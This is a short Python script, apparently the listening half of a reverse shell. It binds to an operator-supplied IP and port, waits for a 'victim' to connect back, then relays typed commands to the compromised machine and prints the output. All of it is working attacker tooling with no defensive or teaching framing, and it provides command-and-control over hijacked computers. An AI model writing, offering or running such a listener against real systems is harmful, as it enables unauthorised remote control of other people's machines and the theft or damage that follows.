import socket
import optparse
import os
def getIP():
    parser = optparse.OptionParser()
    parser.add_option("-i", "--ip", dest="ip", help="Listening IP address")
    parser.add_option("-p", "--port", dest="port", help="Listening Port")
    (options, arguments) = parser.parse_args()
    if not options.ip:
        parser.error("Please enter the IP you're using for listening connections")
    if not options.port:
        parser.error("Please enter the Port you're using for listening connections")
    else:
        return options

args = getIP()
listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
listener.bind((args.ip, int(args.port)))
listener.listen(0)
print("[+] Listening for victim connection...")
connection, address = listener.accept()
print(f"[+] Victim connected from {address} !")

while True:
    try:
        command = input(">> ").encode()
        connection.send(command)
        result = connection.recv(1024)
        result = result.decode(errors="replace")
        print(result)
    except KeyboardInterrupt:
        ask = input("\nAre you sure you want to terminate the session Y or N : ")
        if ask == "Y" or ask == "y":
            print("[+] Session Terminated !")
            break;
        elif ask == "N" or ask == "n" :
            print("[+] Wise decision samurai !")

listener.close()
